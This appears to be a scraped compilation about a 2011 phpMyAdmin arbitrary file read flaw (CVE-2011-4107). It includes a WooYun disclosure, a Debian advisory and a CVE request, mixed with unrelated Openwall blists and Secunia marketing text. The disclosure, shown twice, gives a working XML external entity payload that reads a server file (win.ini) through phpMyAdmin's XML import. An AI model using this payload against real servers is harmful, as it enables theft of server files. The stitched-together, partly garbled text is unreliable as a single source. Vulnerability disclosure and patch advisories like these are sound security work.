# PhpMyAdmin Arbitrary File Reading

---

*From*: WooYun <root () wooyun org>

*Date*: Wed, 2 Nov 2011 15:30:56 +0800

```
Hi

80sec report this bug on wooyun,PhpMyadmin use a simplexml_load_string
function to read xml from user input,this may be exploied to read files
from the server or network

in libraries/import/xml.php,some code like this

/**

 * Load the XML string

 *

 * The option LIBXML_COMPACT is specified because it can

 * result in increased performance without the need to

 * alter the code in any way. It's basically a freebee.

 */

$xml = simplexml_load_string($buffer, "SimpleXMLElement", LIBXML_COMPACT);

unset($buffer);

/**

 * The XML was malformed

 */

if ($xml === FALSE) {

so you just need to make a xml like this

<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE wooyun [

  <!ENTITY hi80sec SYSTEM "file:///c:/windows/win.ini">

]>

<pma_xml_export version="1.0" xmlns:pma="
[http://www.phpmyadmin.net/some_doc_url/"](http://www.phpmyadmin.net/some_doc_url/%22);>

    <!--

    - Structure schemas

    -->

    <pma:structure_schemas>

        <pma:database name="test" collation="utf8_general_ci"
charset="utf8">

            <pma:table name="ts_ad">

                &hi80sec;

            </pma:table>

        </pma:database>

    </pma:structure_schemas>

    <!--

    - 数据库: 'thinksns'

    -->

    <database name="thinksns">

        <!-- 表 ts_ad -->

    </database>

</pma_xml_export>

then import this xml in PhpMyAdmin,you will get the content you want.

CVE ID         : CVE-2011-1940 CVE-2011-3181 CVE-2011-4107
Debian Bug     : 656247

Several vulnerabilities have been discovered in phpMyAdmin, a tool
to administer MySQL over the web. The Common Vulnerabilities and
Exposures project identifies the following problems:

CVE-2011-4107

  The XML import plugin allowed a remote attacker to read arbitrary
  files via XML data containing external entity references.

CVE-2011-1940, CVE-2011-3181

  Cross site scripting was possible in the table tracking feature,
  allowing a remote attacker to inject arbitrary web script or HTML.

The oldstable distribution (lenny) is not affected by these problems.

For the stable distribution (squeeze), these problems have been fixed
in version 4:3.3.7-7.

For the testing distribution (wheezy) and unstable distribution (sid),
these problems have been fixed in version 4:3.4.7.1-1.

We recommend that you upgrade your phpmyadmin packages.

# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via

Hi
80sec report this bug on wooyun,PhpMyadmin use a simplexml\_load\_string
function to read xml from user input,this may be exploied to read files
from the server or network
in libraries/import/xml.php,some code like this
/\*\*
\* Load the XML string
\*
\* The option LIBXML\_COMPACT is specified because it can
\* result in increased performance without the need to
\* alter the code in any way. It's basically a freebee.
\*/
$xml = simplexml\_load\_string($buffer, "SimpleXMLElement", LIBXML\_COMPACT);
unset($buffer);
/\*\*
\* The XML was malformed
\*/
if ($xml === FALSE) {
so you just need to make a xml like this
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE wooyun [
<!ENTITY hi80sec SYSTEM "file:///c:/windows/win.ini">
]>
<pma\_xml\_export version="1.0" xmlns:pma="
http://www.phpmyadmin.net/some\_doc\_url/">
<!--
- Structure schemas
-->
<pma:structure\_schemas>
<pma:database name="test" collation="utf8\_general\_ci"
charset="utf8">
<pma:table name="ts\_ad">
&hi80sec;
</pma:table>
</pma:database>
</pma:structure\_schemas>
<!--
- &#202;&#190;&#191;: 'thinksns'
-->
<database name="thinksns">
<!-- &#177; ts\_ad -->
</database>
</pma\_xml\_export>
then import this xml in PhpMyAdmin,you will get the content you want.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Subject: CVE Request -- phpMyAdmin -- Arbitrary local file read flaw by loading
 XML strings / importing XML files

Hello Kurt, Steve, vendors, phpMyAdmin Security Team,

   a local file inclusion flaw was found in the way XML import plug-in of
phpMyAdmin, a tool written in PHP intended to handle the administration
of MySQL over the World Wide Web, performed import of malformed XML
files. A remote attacker could provide a specially-crafted XML file,
which once imported into the phpMyAdmin service instance would lead to
arbitrary local file (accessible with the privileges of the phpMyAdmin
user) read / retrieval.

Could you allocate a CVE id for this?

Thank you && Regards, Jan.
